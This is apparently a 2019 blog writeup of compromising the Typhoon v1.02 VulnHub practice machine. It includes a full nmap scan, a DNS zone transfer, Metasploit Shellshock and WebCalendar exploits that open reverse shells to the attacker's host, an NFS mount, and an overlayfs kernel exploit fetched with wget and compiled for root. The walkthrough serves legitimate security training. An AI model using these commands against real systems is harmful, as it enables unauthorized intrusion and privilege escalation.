---
title:    "Typhoon v1.02 writeup"
date:     2019-02-13
tags:     VulnHub
category:	Cybersecurity
comment:  header sizes are 2000x750
header:
  image:    assets/images/2019-02-13-typhoon-v102-writeup/header.jpg
  teaser:   assets/images/2019-02-13-typhoon-v102-writeup/header.jpg
  caption:  "Photo credit: [**Unsplash**](https://unsplash.com)"
---

This is a writeup for the [Typhoon v1.02 machine on VulnHub](https://www.vulnhub.com/entry/typhoon-102,267/).
This is a highly vulnerable machine, with multiple potential entry points. There
are four different flags to capture.

## Step 1: Scanning

### Nmap

```
$ nmap -A -T5 10.99.59.112
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-13 13:27 EST
Stats: 0:00:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.31% done; ETC: 13:27 (0:00:00 remaining)
Nmap scan report for 10.99.59.112
Host is up (0.00059s latency).
Not shown: 983 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.99.78.205
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 02:df:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 (DSA)
|   2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:dd (RSA)
|   256 70:ae:36:6c:42:7d:ed:1b:c0:40:fc:2d:00:8d:87:11 (ECDSA)
|_  256 bb:ce:f2:98:64:f7:8f:ae:f0:dd:3c:23:3b:a6:0f:61 (ED25519)
25/tcp   open  smtp        Postfix smtpd
|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: TLS randomness does not represent time
53/tcp   open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3-Ubuntu
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/mongoadmin/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Typhoon Vulnerable VM by PRISMA CSI
110/tcp  open  pop3        Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL STLS TOP AUTH-RESP-CODE UIDL CAPA PIPELINING
|_ssl-date: TLS randomness does not represent time
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      34758/udp  mountd
|   100005  1,2,3      59107/tcp  mountd
|   100021  1,3,4      39146/tcp  nlockmgr
|   100021  1,3,4      45519/udp  nlockmgr
|   100024  1          50443/tcp  status
|   100024  1          59636/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: STARTTLS LOGIN-REFERRALS ID more Pre-login capabilities SASL-IR listed post-login IMAP4rev1 IDLE have ENABLE LITERAL+ OK LOGINDISABLEDA0001
|_ssl-date: TLS randomness does not represent time
445/tcp  open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
631/tcp  open  ipp         CUPS 1.7
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/1.7 IPP/2.1
|_http-title: Home - CUPS 1.7.2
993/tcp  open  ssl/imaps?
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3s?
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nfs_acl     2-3 (RPC #100227)
3306/tcp open  mysql       MySQL (unauthorized)
5432/tcp open  postgresql  PostgreSQL DB 9.3.3 - 9.3.5
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
MAC Address: 00:0C:29:F7:56:96 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts:  typhoon, TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m16s, median: 0s
|_nbstat: NetBIOS name: TYPHOON, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   Computer name: typhoon
|   NetBIOS computer name: TYPHOON\x00
|   Domain name: local
|   FQDN: typhoon.local
|_  System time: 2019-02-13T20:27:44+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-02-13 13:27:44
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms 10.99.59.112

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 170.01 seconds
```

### Nikto

```
$ nikto -host 10.99.59.112
```
We find lots of potential entry points!

### DNS server

The DNS server port (53) is open. We can try our luck and see if it allows zone transfers.

But first we need to know what domain it is serving. We can guess this server's
domain name through its SMTP server.

```
$ telnet 10.99.59.112 25
Trying 10.99.59.112...
Connected to 10.99.59.112.
Escape character is '^]'.
EHLO kali.local
220 typhoon ESMTP Postfix (Ubuntu)
250-typhoon
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
VRFY root@typhoon.local 
252 2.0.0 root@typhoon.local
```

The DNS server is probably serving typhoon.local, let's try to perform a zone transfer!

```
$ dig axfr @10.99.59.112 typhoon.local

; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr @10.99.59.112 typhoon.local
; (1 server found)
;; global options: +cmd
typhoon.local.		3600	IN	SOA	ns.prismacsi.com. enes.prismacsi.com. 1 3600 600 86400 3600
typhoon.local.		3600	IN	NS	ns1.typhoon.local.
typhoon.local.		3600	IN	NS	ns2.typhoon.local.
calendar.typhoon.local.	3600	IN	CNAME	wwww.typhoon.local.
flag.typhoon.local.	3600	IN	TXT	"<FLAG>"
ns1.typhoon.local.	3600	IN	A	192.168.1.5
ns2.typhoon.local.	3600	IN	A	192.168.1.6
prisma.typhoon.local.	3600	IN	A	192.168.1.8
secretmessage.typhoon.local. 3600 IN	TXT	"prismacsi.com"
www.typhoon.local.	3600	IN	A	192.168.1.7
typhoon.local.		3600	IN	SOA	ns.prismacsi.com. enes.prismacsi.com. 1 3600 600 86400 3600
;; Query time: 1 msec
;; SERVER: 10.99.59.112#53(10.99.59.112)
;; WHEN: Thu Feb 14 15:38:27 EST 2019
;; XFR size: 11 records (messages 1, bytes 338)
```

We got a flag! 1/4 flags.

## Step 2: Breaking into the machine

### Shellshock

```
[...]
+ OSVDB-112004: /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability
(http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
[...]
```

The machine appears to be vulnerable to Shellshock. It was a critical vulnerability
discovered in 2014 that affected OSes which shipped the Bash shell, including, but
not limited to Linux and Mac OS X. We'll use it to spawn a shell in the system.

In Metasploit:

```
msf5 > search shellshock

Matching Modules
================

   Name                                               Disclosure Date  Rank       Check  Description
   ----                                               ---------------  ----       -----  -----------
   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   [...]
   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   [...]

msf5 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show payloads

Compatible Payloads
===================

   Name                                      Disclosure Date  Rank    Check  Description
   ----                                      ---------------  ----    -----  -----------
   [...]
   linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
   [...]

msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost 10.99.78.205
lhost => 10.99.78.205
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts 10.99.59.112
rhosts => 10.99.59.112
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/test.sh
targeturi => /cgi-bin/test.sh
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting   Required  Description
   ----            ---------------   --------  -----------
   CMD_MAX_LENGTH  2048              yes       CMD max line length
   CVE             CVE-2014-6271     yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent        yes       HTTP header to use
   METHOD          GET               yes       HTTP method to use
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.99.59.112      yes       The target address range or CIDR identifier
   RPATH           /bin              yes       Target PATH for binaries used by the CmdStager
   RPORT           80                yes       The target port (TCP)
   SRVHOST         0.0.0.0           yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT         8080              yes       The local port to listen on.
   SSL             false             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /cgi-bin/test.sh  yes       Path to CGI script
   TIMEOUT         5                 yes       HTTP read response timeout (seconds)
   URIPATH                           no        The URI to use for this exploit (default is random)
   VHOST                             no        HTTP server virtual host


Payload options (linux/x86/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.99.78.205     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86


msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 10.99.78.205:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (36 bytes) to 10.99.59.112
[*] Command shell session 1 opened (10.99.78.205:4444 -> 10.99.59.112:57838) at 2019-02-13 13:14:15 -0500

/bin/bash -i
bash: cannot set terminal process group (2473): Inappropriate ioctl for device
bash: no job control in this shell
www-data@typhoon:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@typhoon:/usr/lib/cgi-bin$ uname -a
uname -a
Linux typhoon.local 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
www-data@typhoon:/usr/lib/cgi-bin$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.1 LTS
Release:	14.04
Codename:	trusty

```

### WebCalendar

Because we performed a zone transfer, we were able to get a hint into another possibly vulnerable service. Because the web server is using vhosts, we must edit our `/etc/hosts` file and add the following row:
```
10.99.59.112	calendar.typhoon.local
```

If we now browse to calendar.typhoon.local, we're greeted with a login prompt. Conveniently enough, this page also displays the software version. We seem to be dealing with WebCalendar version 1.2.4.

Let's search for WebCalendar vulnerabilities:

```
$ searchsploit webcalendar
--------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                             |  Path
                                                                           | (/usr/share/exploitdb/)
--------------------------------------------------------------------------- ----------------------------------------
[...]
WebCalendar 1.2.4 - Remote Code Injection (Metasploit)                     | exploits/linux/webapps/18797.rb
[...]
--------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

The exact version this machine is running has a Metasploit module readily available! Isn't that just convenient?

In the Metasploit console:

```
msf5 > use exploit/linux/http/webcalendar_settings_exec
msf5 exploit(linux/http/webcalendar_settings_exec) > set rhosts calendar.typhoon.local
rhosts => calendar.typhoon.local
msf5 exploit(linux/http/webcalendar_settings_exec) > set vhost calendar.typhoon.local
vhost => calendar.typhoon.local
msf5 exploit(linux/http/webcalendar_settings_exec) > set targeturi /
targeturi => /
msf5 exploit(linux/http/webcalendar_settings_exec) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python
msf5 exploit(linux/http/webcalendar_settings_exec) > set lhost 10.99.78.205
lhost => 10.99.78.205
msf5 exploit(linux/http/webcalendar_settings_exec) > exploit
[*] Started reverse TCP handler on 10.99.78.205:4444 
[*] Housing php payload...
[*] Loading our payload...
[*] Command shell session 1 opened (10.99.78.205:4444 -> 10.99.59.112:42570) at 2019-02-15 13:52:20 -0500
/bin/bash -i
bash: cannot set terminal process group (2524): Inappropriate ioctl for device
bash: no job control in this shell
www-data@typhoon:/var/www/html/calendar/includes$ whoami
whoami
www-data
```

And we're in with a shell.

### NFS

```
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      34758/udp  mountd
|   100005  1,2,3      59107/tcp  mountd
|   100021  1,3,4      39146/tcp  nlockmgr
|   100021  1,3,4      45519/udp  nlockmgr
|   100024  1          50443/tcp  status
|   100024  1          59636/udp  status
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
```

This indicates that the machine has an NFS server running. Let's check it out.

In the Metasploit console:

```
msf5 > search nfs

Matching Modules
================

   Name                                   Disclosure Date  Rank     Check  Description
   ----                                   ---------------  ----     -----  -----------
   [...]
   auxiliary/scanner/nfs/nfsmount                          normal   Yes    NFS Mount Scanner
   [...]
msf5 > use auxiliary/scanner/nfs/nfsmount
msf5 auxiliary(scanner/nfs/nfsmount) > set rhost 10.99.59.112
rhost => 10.99.59.112
msf5 auxiliary(scanner/nfs/nfsmount) > run

[+] 10.99.59.112:111      - 10.99.59.112 NFS Export: /typhoon [*]
[*] 10.99.59.112:111      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The NFS server is sharing a folder at `/typhoon`. Let's mount it.

```
$ mkdir /tmp/typhoon
$ mount -t nfs 10.99.59.112:/typhoon /tmp/typhoon
$ cd /tmp/typhoon
$ ls -lA
total 12
-rw-r--r-- 1 root root   24 Oct 22 17:50 .secret
-rw-r--r-- 1 root root   63 Oct 24 06:58 secret
-rw------- 1 root root 1766 Oct 22 17:51 .secret.rsa
$ cat .secret
belong to typhoon user.
$ cat .secret.rsa
cat: .secret.rsa: Permission denied
$ cat secret
<FLAG>
```

Another flag. 2/4 flags.

## Step 3: Privilege escalation

### OverlayFS (CVE-2015-1328)

This machine runs Ubuntu Linux 14.04 3.13.0. We can use `searchsploit` to see if
there are any published exploits for this kernel version.

```
$ searchsploit 3.13.0
----------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                 |  Path
                                                                                                                                               | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                           | exploits/linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                      | exploits/linux/local/37293.txt
----------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

The first is a C program we'll have to compile and run in the victim machine, and
the second one is a human-readable description of the exploit.

```
$ cat /usr/share/exploitdb/exploits/linux/local/37292.c > exploit.c
$ python2 -m SimpleHTTPServer 8080
```

We're now serving the directory we're in. We want to download the `exploit.c` file
onto the victim machine. For this, we go back to our Bash session, but first we
need to cd into a directory we can write to:

```
www-data@typhoon:/usr/lib$ touch test
touch test
touch: cannot touch 'test': Permission denied
www-data@typhoon:/var/www/html$ cd /var/www/html
cd /var/www/html
www-data@typhoon:/var/www/html$ touch test
touch test
www-data@typhoon:/var/www/html$ ls
ls
assets
calendar
cms
drupal
dvwa
index.html
mongoadmin
robots.txt
test
xvwa
www-data@typhoon:/var/www/html$ wget http://10.99.78.205/exploit.c
[...]
2019-02-13 20:56:55 (537 MB/s) - 'exploit.c' saved [5119/5119]
www-data@typhoon:/var/www/html$ gcc exploit.c -o exploit
gcc exploit.c -o exploit
www-data@typhoon:/var/www/html$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
#
```

We now have a shell prompt with root privileges. Let's read the root flag!

```
# cat /root/root-flag
<FLAG>
```
Last flag I have found. 3/4 flags.

## Summary

So far, I've only been able to find 3 out of the 4 total flags.

1. DNS flag
2. NFS flag
3. Root flag

The VM is available on [VulnHub](https://www.vulnhub.com/entry/typhoon-102,267/).
I used VMware Fusion to run the VM. The process took me about 3-4 hours of trial
and error.
